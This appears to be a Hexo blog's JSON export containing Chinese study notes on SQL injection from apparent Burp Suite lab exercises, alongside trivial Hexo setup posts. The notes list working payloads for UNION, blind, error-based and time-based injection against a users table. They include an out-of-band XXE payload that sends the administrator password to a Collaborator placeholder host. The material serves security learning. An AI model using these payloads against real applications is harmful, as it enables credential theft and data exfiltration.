{"meta":{"title":"古余blog","subtitle":"","description":"this is blog!!!","author":"guyu223","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2025-02-10T14:06:25.842Z","updated":"2025-02-10T14:06:25.842Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"### 联系方式 Email: 3101930294@qq.com GitHub: guyu223"},{"title":"所有分类","date":"2025-02-10T14:09:25.813Z","updated":"2025-02-10T14:09:25.813Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"我的朋友们","date":"2025-02-16T05:07:56.646Z","updated":"2025-02-16T05:07:56.646Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-02-13T08:20:07.885Z","updated":"2025-02-13T08:20:07.885Z","comments":true,"path":"tag/index.html","permalink":"http://example.com/tag/index.html","excerpt":"","text":""}],"posts":[{"title":"第三篇：sql注入","slug":"sql注入","date":"2025-03-16T09:11:21.000Z","updated":"2025-03-16T09:48:22.061Z","comments":true,"path":"2025/03/16/sql注入/","permalink":"http://example.com/2025/03/16/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"第三篇：sql注入SQL 注入 UNION 攻击，确定查询返回的列数：1234/?category=gifts&#x27;+UNION+SELECT+NULL,NULL-- 有则正确返回包，无则报错或/？category=gifts&#x27;+order+by+1,2# 无则正确返回包，有则报错哈希字符可用于标识注释。--# 查找数据列的字段类型：1234/?category=gifts&#x27;+UNION+SELECT +&#x27;a&#x27;,NULL,NULL,NULL--/?category=gifts&#x27;+UNION+SELECT +NULL,+&#x27;a&#x27;,NULL,NULL--/?category=gifts&#x27;+UNION+SELECT +NULL,NULL,+&#x27;a&#x27;,NULL--/?category=gifts&#x27;+UNION+SELECT +NULL,NULL,NULL,+&#x27;a&#x27;-- 对则正确返回包，无则报错 从表中检索数据:1?category=gifts&#x27;+UNION+SELECT+username,+password+FROM+users-- 检索单个列中的多个值:使用一列的位置查找多个值 1?category=gifts&#x27;+UNION+SELECT+username||&#x27;~&#x27;||password+FROM+users-- 不同数据库对应的连接符： 12345Oracle &#x27;foo&#x27;||&#x27;bar&#x27;Microsoft &#x27;foo&#x27;+&#x27;bar&#x27;PostgreSQL &#x27;foo&#x27;||&#x27;bar&#x27;MySQL &#x27;foo&#x27; &#x27;bar&#x27; [Note the space between the two strings]CONCAT(&#x27;foo&#x27;,&#x27;bar&#x27;) 查询数据库类型和版本：1?category=gifts&#x27;+UNION+SELECT+@@version-- 不同数据库对应的查询版本命令： 123456Oracle： SELECT banner FROM v$version SELECT version FROM v$instance Microsoft： SELECT @@versionPostgreSQL： SELECT version()MySQL： SELECT @@version 列出数据库的内容：查询以列出数据库中的表： information_schema.tables 1SELECT * FROM information_schema.tables 查询以列出各个表中的列： information_schema.columns 1SELECT * FROM information_schema.columns WHERE table_name = &#x27;Users&#x27; 盲目 SQL 注入使用条件响应进行盲目 SQL 注入：使用到的sql函数： LIMIT 1： 查看第一列是否有数据 length(password)&gt;2：判断字节长度 SUBSTRING(password,1,1）：查看password第一列第一个字符 12345678TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users LIMIT 1)=&#x27;a 查看是否有user表TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users where username=&#x27;administrator&#x27;)=&#x27;a 查看user表是否有admin用户TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users where username=&#x27;administrator&#x27; and length(password)&gt;1)=&#x27;a TrackingId=xyz&#x27; AND (SELECT &#x27;a&#x27; FROM users where username=&#x27;administrator&#x27; and length(password)&gt;2)=&#x27;a ......查看password长度 TrackingId=xyz&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a TrackingId=xyz&#x27; AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username=&#x27;administrator&#x27;)=&#x27;a ..... 爆破password字段每位字符。 基于错误的 SQL 注入:通过触发条件错误来利用盲目 SQL 注入 DUAL是Oracle与数据字典一起自动创建的一个最小工作表，它只有一列：DUMMY，其数据类型为：VARCHAR2(1)。DUAL中只有一行数据：&#39;X&#39;。DUAL属于SYS模式，但所有用户都可以使用DUAL名称访问它。 1TrackingId=xyz&#x27;||(SELECT &#x27;&#x27; FROM dual WHERE ROWNUM = 1)||&#x27; TrackingId&#x3D;xyz’||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#39;&#39; END FROM dual)||’ 先判断 case when （1&#x3D;1）是否正确，正确执行then 因为1&#x2F;0，0不能是被除数 则返回错误信息 123456TrackingId=xyz&#x27;||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27; （收到错误），确认存在名为 的用户。administratorTrackingId=xyz&#x27;&#x27;||(SELECT CASE WHEN LENGTH(password)&gt;1 THEN to_char(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27; （收到错误），判断字长 直到收到成功报文。TrackingId=xyz&#x27;&#x27;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#x27;a&#x27; THEN to_char(1/0) ELSE &#x27;&#x27; END FROM users WHERE username=&#x27;administrator&#x27;)||&#x27; （收到错误）则找到对应字符 因为是报错注入，因此状态码为500是爆破成功的。 基于可见的错误的 SQL 注入：通过注入错误，返回错误信息，根据报错信息SQL注入 CAST((SELECT 1) AS int 调整查询以包含泛型子查询，并将返回的值转换为数据类型 1TrackingId=ogAZZfxtOKUELbuJ&#x27; AND CAST((SELECT 1) AS int)-- 修改条件，添加比较运算符 &#x3D; 1TrackingId=ogAZZfxtOKUELbuJ&#x27; AND 1=CAST((SELECT 1) AS int)-- 返回成功报文 构造语句正确，开始查询 1TrackingId=ogAZZfxtOKUELbuJ&#x27; AND 1=CAST((SELECT username from users) AS int)-- 收到初始错误消息: 1Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = &#x27;IZhjuERH9SHnuYkd&#x27; AND 1=CAST((SELECT username from users) AS&#x27;. Expected char 原因：字符限制,查询被截断 删除cookies值解除字符长度限制 1TrackingId=&#x27; AND 1=CAST((SELECT username from users) AS int)-- 仍然报错： 1ERROR: more than one row returned by a subquery used as an expression 原因：返回结果超过一行 添加限制： 1TrackingId=&#x27; AND 1=CAST((SELECT username from users limit 1) AS int)-- 成功！ 更改想要查询的字段名找到password 1TrackingId=&#x27; AND 1=CAST((SELECT password from users limit 1) AS int)-- 基于延时触发的sql盲注入：因错误信息的被完善，无法发现注入区别，可以使用延时触发sql注入 pg_sleep(4) 休眠时间 成功延时4s，失败无变化 1TrackingId=x&#x27;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END-- 如果构造语句没问题，就开始查询信息 123TrackingId=x&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;administrator&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--TrackingId=x&#x27;%3BSELECT+CASE+WHEN+(username=&#x27;administrator&#x27;+and+substring(password,1,1)=&#x27;a&#x27;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users-- 爆破查看接收到响应数值判断密码 带外交互的 SQL 盲注入:修改 Cookie，将其更改为将触发与 Collaborator 服务器交互的有效负载 1TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual-- 右键单击并选择“Insert Collaborator payload”插入指定playload位置 确认了触发带外交互的方法后，可以使用带外通道从易受攻击的应用程序中泄露数据。 1TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--","categories":[{"name":"bp靶场","slug":"bp靶场","permalink":"http://example.com/categories/bp%E9%9D%B6%E5%9C%BA/"},{"name":"sql注入","slug":"bp靶场/sql注入","permalink":"http://example.com/categories/bp%E9%9D%B6%E5%9C%BA/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"UNION 攻击","slug":"UNION-攻击","permalink":"http://example.com/tags/UNION-%E6%94%BB%E5%87%BB/"},{"name":"条件响应盲注","slug":"条件响应盲注","permalink":"http://example.com/tags/%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9B%B2%E6%B3%A8/"},{"name":"基于错误的盲注","slug":"基于错误的盲注","permalink":"http://example.com/tags/%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%9B%B2%E6%B3%A8/"},{"name":"基于延时盲注","slug":"基于延时盲注","permalink":"http://example.com/tags/%E5%9F%BA%E4%BA%8E%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://example.com/tags/%E7%9B%B2%E6%B3%A8/"}]},{"title":"第二篇：主题坏了重装！","slug":"第二篇：主题坏了重装！","date":"2025-02-10T13:11:21.000Z","updated":"2025-02-10T13:12:11.570Z","comments":true,"path":"2025/02/10/第二篇：主题坏了重装！/","permalink":"http://example.com/2025/02/10/%E7%AC%AC%E4%BA%8C%E7%AF%87%EF%BC%9A%E4%B8%BB%E9%A2%98%E5%9D%8F%E4%BA%86%E9%87%8D%E8%A3%85%EF%BC%81/","excerpt":"","text":"重装验证","categories":[],"tags":[]},{"title":"第一篇：写文章！","slug":"第一篇：写文章！","date":"2025-02-10T12:58:01.000Z","updated":"2025-02-10T13:49:46.330Z","comments":true,"path":"2025/02/10/第一篇：写文章！/","permalink":"http://example.com/2025/02/10/%E7%AC%AC%E4%B8%80%E7%AF%87%EF%BC%9A%E5%86%99%E6%96%87%E7%AB%A0%EF%BC%81/","excerpt":"","text":"hexo写文章：创建md文件1hexo new &quot;name&quot; 文章在hexo-blog\\source\\posts下 本地预览1hexo s 上传至github12hexo ghexo d","categories":[{"name":"分类1","slug":"分类1","permalink":"http://example.com/categories/%E5%88%86%E7%B1%BB1/"}],"tags":[{"name":"标签1","slug":"标签1","permalink":"http://example.com/tags/%E6%A0%87%E7%AD%BE1/"},{"name":"标签2","slug":"标签2","permalink":"http://example.com/tags/%E6%A0%87%E7%AD%BE2/"}]},{"title":"Hello World","slug":"hello-world","date":"2025-02-10T12:46:20.471Z","updated":"2025-02-10T12:46:20.471Z","comments":true,"path":"2025/02/10/hello-world/","permalink":"http://example.com/2025/02/10/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"bp靶场","slug":"bp靶场","permalink":"http://example.com/categories/bp%E9%9D%B6%E5%9C%BA/"},{"name":"sql注入","slug":"bp靶场/sql注入","permalink":"http://example.com/categories/bp%E9%9D%B6%E5%9C%BA/sql%E6%B3%A8%E5%85%A5/"},{"name":"分类1","slug":"分类1","permalink":"http://example.com/categories/%E5%88%86%E7%B1%BB1/"}],"tags":[{"name":"UNION 攻击","slug":"UNION-攻击","permalink":"http://example.com/tags/UNION-%E6%94%BB%E5%87%BB/"},{"name":"条件响应盲注","slug":"条件响应盲注","permalink":"http://example.com/tags/%E6%9D%A1%E4%BB%B6%E5%93%8D%E5%BA%94%E7%9B%B2%E6%B3%A8/"},{"name":"基于错误的盲注","slug":"基于错误的盲注","permalink":"http://example.com/tags/%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E7%9B%B2%E6%B3%A8/"},{"name":"基于延时盲注","slug":"基于延时盲注","permalink":"http://example.com/tags/%E5%9F%BA%E4%BA%8E%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"盲注","slug":"盲注","permalink":"http://example.com/tags/%E7%9B%B2%E6%B3%A8/"},{"name":"标签1","slug":"标签1","permalink":"http://example.com/tags/%E6%A0%87%E7%AD%BE1/"},{"name":"标签2","slug":"标签2","permalink":"http://example.com/tags/%E6%A0%87%E7%AD%BE2/"}]}